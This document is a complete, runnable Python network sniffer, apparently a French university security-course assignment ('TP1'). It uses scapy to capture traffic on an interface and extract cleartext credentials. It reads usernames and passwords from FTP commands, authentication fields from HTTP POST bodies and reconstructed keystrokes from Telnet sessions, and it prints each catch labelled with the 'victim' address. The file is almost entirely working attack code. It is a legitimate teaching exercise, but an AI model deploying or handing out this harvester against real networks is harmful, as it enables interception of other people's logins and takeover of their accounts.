#!/usr/bin/env python3
"""
sniffer.py — Renifleur de Réseau et Extraction de Credentials
TP1 — Sécurité Réseau avec Python

Usage :
  sudo python3 sniffer.py -i <interface> [-f "filtre_bpf"]

Exemples :
  sudo python3 sniffer.py -i eth0
  sudo python3 sniffer.py -i wlan0 -f "tcp port 21 or tcp port 80 or tcp port 23"
  sudo python3 sniffer.py -i eth0 -f "tcp port 23"
"""

import argparse
import re
import sys
from datetime import datetime
from urllib.parse import unquote_plus

from scapy.all import IP, TCP, UDP, ICMP, PcapWriter, sniff


# ============================================================
# PARTIE A : COMPTEURS GLOBAUX ET FICHIERS DE SORTIE
# ============================================================

compteurs = {"TCP": 0, "UDP": 0, "ICMP": 0}
pcap_writer = None
log_file = None


# ============================================================
# PARTIE B : EXTRACTION FTP — Personne B
# ============================================================

ftp_sessions = {}


def extraire_ftp(packet):
    """Détecte les commandes USER et PASS du protocole FTP (port 21)."""
    if not packet.haslayer(TCP) or not packet.haslayer("Raw"):
        return

    tcp = packet[TCP]
    ip = packet[IP]
    sport, dport = tcp.sport, tcp.dport

    if sport != 21 and dport != 21:
        return

    try:
        payload = packet["Raw"].load.decode("utf-8", errors="ignore").strip()
    except Exception:
        return

    client_ip = ip.src if sport != 21 else ip.dst
    serveur_ip = ip.dst if sport != 21 else ip.src
    client_port = sport if sport != 21 else dport
    cle_session = (client_ip, serveur_ip, client_port)

    # Détection USER
    user_match = re.search(r"^USER\s+(.+)$", payload, re.IGNORECASE)
    if user_match:
        username = user_match.group(1).strip()
        if cle_session not in ftp_sessions:
            ftp_sessions[cle_session] = {"user": "", "password": ""}
        ftp_sessions[cle_session]["user"] = username
        print(f"  [FTP] USER détecté → {username}")

    # Détection PASS
    pass_match = re.search(r"^PASS\s+(.+)$", payload, re.IGNORECASE)
    if pass_match:
        password = pass_match.group(1).strip()
        if cle_session not in ftp_sessions:
            ftp_sessions[cle_session] = {"user": "", "password": ""}
        ftp_sessions[cle_session]["password"] = password

        user = ftp_sessions[cle_session].get("user", "")
        if user:
            horodatage = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
            print("\n" + "=" * 60)
            print(f"  [CREDENTIALS FTP CAPTURÉS]  @ {horodatage}")
            print(f"  Victime      : {client_ip}:{client_port}")
            print(f"  Serveur FTP  : {serveur_ip}:21")
            print(f"  Protocole    : FTP")
            print(f"  Username     : {user}")
            print(f"  Password     : {password}")
            print("=" * 60 + "\n")


# ============================================================
# PARTIE B : EXTRACTION HTTP — Personne B
# ============================================================

MOTS_CLES_AUTH = [
    "password", "passwd", "pwd", "pass",
    "login", "username", "user", "email"
]


def extraire_http(packet):
    """Analyse les requêtes HTTP POST et extrait les champs d'authentification."""
    if not packet.haslayer(TCP) or not packet.haslayer("Raw"):
        return

    tcp = packet[TCP]
    ip = packet[IP]

    if tcp.sport != 80 and tcp.dport != 80:
        return

    try:
        payload = packet["Raw"].load.decode("utf-8", errors="ignore")
    except Exception:
        return

    if not payload.startswith("POST"):
        return

    # Extraction de l'URL ciblée
    url_match = re.search(r"^POST\s+(\S+)\s+HTTP", payload)
    url_ciblee = url_match.group(1) if url_match else "inconnue"

    # Extraction du Host
    host_match = re.search(r"^Host:\s*(\S+)\s*$", payload, re.MULTILINE)
    host = host_match.group(1) if host_match else ""

    # Extraction du corps de la requête
    body_match = re.search(r"\r\n\r\n(.+)", payload, re.DOTALL)
    if not body_match:
        return

    body = body_match.group(1)
    credentials = {}

    for param in body.split("&"):
        if "=" not in param:
            continue
        key, value = param.split("=", 1)
        key_lower = key.lower()
        if any(mot in key_lower for mot in MOTS_CLES_AUTH):
            credentials[key] = unquote_plus(value)

    if credentials:
        horodatage = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        print("\n" + "=" * 60)
        print(f"  [CREDENTIALS HTTP CAPTURÉS]  @ {horodatage}")
        print(f"  Victime      : {ip.src if tcp.sport != 80 else ip.dst}")
        print(f"  Serveur HTTP : {ip.dst if tcp.sport != 80 else ip.src}:80")
        print(f"  Protocole    : HTTP")
        print(f"  URL ciblée   : http://{host}{url_ciblee}")
        print(f"  Données      :")
        for k, v in credentials.items():
            print(f"    {k:15s} = {v}")
        print("=" * 60 + "\n")


# ============================================================
# PARTIE B : EXTRACTION TELNET — Personne C
# ============================================================

# Constantes Telnet IAC (Interpret As Command)
IAC = 255
DONT = 254
DO = 253
WONT = 252
WILL = 251
SB = 250
SE = 240

# Buffer des sessions Telnet : { (ip_client, ip_serveur) : str }
telnet_sessions = {}


def nettoyer_negotiation_telnet(data):
    """
    Supprime les séquences de négociation IAC du flux Telnet.
    Ne conserve que les caractères utilisateur réels.
    """
    resultat = []
    i = 0
    longueur = len(data)

    while i < longueur:
        if data[i] != IAC:
            resultat.append(chr(data[i]))
            i += 1
            continue

        # IAC détecté
        if i + 1 >= longueur:
            resultat.append(chr(data[i]))
            i += 1
            continue

        cmd = data[i + 1]

        if cmd in (DO, DONT, WILL, WONT):
            # IAC + cmd + option = 3 octets à ignorer
            i += 3
            continue

        elif cmd == SB:
            # Subnegotiation : chercher IAC SE
            j = i + 2
            while j < longueur - 1:
                if data[j] == IAC and data[j + 1] == SE:
                    i = j + 2
                    break
                j += 1
            else:
                i += 1  # Séquence non trouvée, on avance
            continue

        elif cmd == IAC:
            # IAC IAC → un seul IAC littéral (0xFF échappé)
            resultat.append(chr(IAC))
            i += 2
            continue

        else:
            # Autre commande IAC inconnue
            i += 2
            continue

    return "".join(resultat)


def extraire_telnet(packet):
    """Analyse le trafic Telnet et reconstitue les caractères saisis."""
    if not packet.haslayer(TCP) or not packet.haslayer("Raw"):
        return

    tcp = packet[TCP]
    ip = packet[IP]

    if tcp.sport != 23 and tcp.dport != 23:
        return

    est_client = (tcp.sport != 23 and tcp.dport == 23)
    client_ip = ip.src if est_client else ip.dst
    serveur_ip = ip.dst if est_client else ip.src
    cle_session = (client_ip, serveur_ip)

    try:
        texte = nettoyer_negotiation_telnet(packet["Raw"].load)
    except Exception:
        return

    if not texte:
        return

    if cle_session not in telnet_sessions:
        telnet_sessions[cle_session] = ""

    if est_client:
        telnet_sessions[cle_session] += texte
        affichage = texte.replace("\r", "").replace("\n", "\\n")
        if affichage.strip():
            print(f"  [TELNET Keystrokes] ({client_ip}:{tcp.sport}) → {affichage}")
    else:
        msg = texte.replace("\r", "").replace("\n", " ")
        if msg.strip():
            print(f"  [TELNET Server] ({serveur_ip}) → {msg.strip()}")


def bilan_telnet():
    """Affiche le récapitulatif des credentials Telnet reconstitués."""
    if not telnet_sessions:
        return

    print("\n" + "=" * 60)
    print("  [RAPPORT CREDENTIALS TELNET]")
    print("=" * 60)

    for (client_ip, serveur_ip), buffer in telnet_sessions.items():
        if not buffer:
            continue

        nettoye = buffer.replace("\r", "")
        lignes = [l.strip() for l in nettoye.split("\n") if l.strip()]

        if not lignes:
            continue

        print(f"\n  Session Telnet : {client_ip} → {serveur_ip}")
        print(f"  Séquences reconstituées :")
        for ligne in lignes:
            print(f"    >> {ligne}")

        if len(lignes) >= 1:
            print(f"\n  [+] Username probable : {lignes[0]}")
        if len(lignes) >= 2:
            print(f"  [+] Password probable : {lignes[1]}")

    print("=" * 60 + "\n")


# ============================================================
# PARTIE A : FONCTION PRINCIPALE DE TRAITEMENT DES PAQUETS
# ============================================================

def analyser_paquet(packet):
    """
    Callback appelée pour chaque paquet capturé.
    Sauvegarde dans le .pcap, extrait les infos, log, et appelle
    les modules d'extraction de credentials.
    """
    global compteurs, pcap_writer, log_file

    # 1. Sauvegarde immédiate dans le fichier PCAP
    if pcap_writer:
        pcap_writer.write(packet)

    # 2. Vérification de la couche IP
    if IP not in packet:
        return

    ip_src = packet[IP].src
    ip_dst = packet[IP].dst
    horodatage = packet.time

    protocole = "Inconnu"
    port_src = "-"
    port_dst = "-"

    # 3. Identification du protocole de transport
    if TCP in packet:
        protocole = "TCP"
        port_src = packet[TCP].sport
        port_dst = packet[TCP].dport
        compteurs["TCP"] += 1

    elif UDP in packet:
        protocole = "UDP"
        port_src = packet[UDP].sport
        port_dst = packet[UDP].dport
        compteurs["UDP"] += 1

    elif ICMP in packet:
        protocole = "ICMP"
        compteurs["ICMP"] += 1

    # 4. Construction et affichage de la ligne
    horodatage_lisible = datetime.fromtimestamp(horodatage).strftime(
        "%Y-%m-%d %H:%M:%S.%f"
    )[:-3]
    ligne = (
        f"[{horodatage_lisible}] {protocole:5s} | "
        f"{ip_src:15s}:{str(port_src):5s} -> "
        f"{ip_dst:15s}:{str(port_dst):5s}"
    )
    print(ligne)

    # 5. Écriture dans le fichier log
    if log_file:
        log_file.write(ligne + "\n")
        log_file.flush()  # Force l'écriture disque immédiate

    # 6. Appels aux modules d'extraction de credentials
    extraire_ftp(packet)
    extraire_http(packet)
    extraire_telnet(packet)


# ============================================================
# BILAN FINAL
# ============================================================

def bilan_final():
    """Affiche le bilan final du nombre de paquets capturés par protocole."""
    print("\n" + "=" * 50)
    print("         BILAN FINAL DE LA CAPTURE")
    print("=" * 50)
    total = sum(compteurs.values())
    for proto in ["TCP", "UDP", "ICMP"]:
        print(f"  {proto:5s} : {compteurs.get(proto, 0):6d} paquets")
    print("-" * 50)
    print(f"  TOTAL : {total:6d} paquets")
    print("=" * 50)


# ============================================================
# POINT D'ENTRÉE PRINCIPAL
# ============================================================

def main():
    global pcap_writer, log_file

    parser = argparse.ArgumentParser(
        description="sniffer.py — Renifleur réseau avec extraction de credentials"
    )
    parser.add_argument(
        "-i", "--interface",
        required=True,
        help="Interface réseau à écouter (ex: eth0, wlan0)"
    )
    parser.add_argument(
        "-f", "--filtre",
        default="",
        help='Filtre BPF optionnel (ex: "tcp port 21 or tcp port 80")'
    )
    args = parser.parse_args()

    print(f"[*] sniffer.py — TP1 Sécurité Réseau")
    print(f"[*] Interface : {args.interface}")
    print(f"[*] Filtre BPF : {args.filtre or 'aucun'}")
    print(f"[*] Ctrl+C pour arrêter la capture.\n")

    try:
        # Ouverture des fichiers de sortie
        pcap_writer = PcapWriter("capture.pcap", append=True, sync=True)
        log_file = open("capture.log", "w", encoding="utf-8")
        log_file.write(
            f"=== Sniffer Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n"
        )
        log_file.write(f"Interface: {args.interface} | Filtre: {args.filtre or 'aucun'}\n\n")
        log_file.flush()

        # Lancement de la capture
        sniff(
            iface=args.interface,
            filter=args.filtre if args.filtre else None,
            prn=analyser_paquet,
            store=0  # store=0 équivaut à store=False
        )

    except PermissionError:
        print("\n[!] ERREUR : Privilèges insuffisants. Exécutez avec sudo.")
        sys.exit(1)

    except KeyboardInterrupt:
        print("\n\n[!] Capture interrompue par l'utilisateur.")

    except OSError as e:
        print(f"\n[!] ERREUR réseau : {e}")
        sys.exit(1)

    except Exception as e:
        print(f"\n[!] ERREUR inattendue : {e}")
        sys.exit(1)

    finally:
        # Fermeture sécurisée des fichiers
        if pcap_writer:
            pcap_writer.close()
            print(f"\n[*] Fichier capture.pcap généré.")
        if log_file:
            log_file.close()
            print(f"[*] Fichier capture.log généré.")

        # Bilan Telnet (credentials reconstitués)
        bilan_telnet()

        # Bilan final
        bilan_final()


if __name__ == "__main__":
    main()